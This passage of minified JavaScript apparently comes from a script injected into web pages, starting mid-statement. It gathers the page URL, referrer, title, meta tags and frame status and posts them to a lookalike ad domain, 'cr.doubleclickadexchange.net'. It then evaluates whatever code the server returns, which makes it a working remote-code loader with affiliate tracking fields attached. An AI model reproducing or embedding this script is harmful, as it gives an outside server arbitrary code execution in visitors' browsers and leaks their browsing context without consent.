...
b.clientHeight,b=document.querySelectorAll("meta"),k=[],l=[],e=0;e<b.length;e++)switch(b[e].name.toLowerCase()){case "keywords":k.push(b[e].content);break;case "description":l.push(b[e].content)}req={width:req,height:f,frame:c!=c.top,location:a.location.toString(),referer:a.referrer,title:a.title,keywords:k.join(", "),description:l.join(", "),loader:n};a.gotowf||(a.gotowf=!0,ajax(m,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){}}))}}a.body?g():a.addEventListener("DOMContentLoaded",
g)})(window,document,"//cr.doubleclickadexchange.net/post",{"cert":true,"create_date":1463158083,"geo":"CR","name":"gapis","reg_params":null,"subid":1004983,"time":1478965186.0967,"user":"1004983.10075611","sig":"5ee7543d22ed300b213c9c5bfd3eb11f"});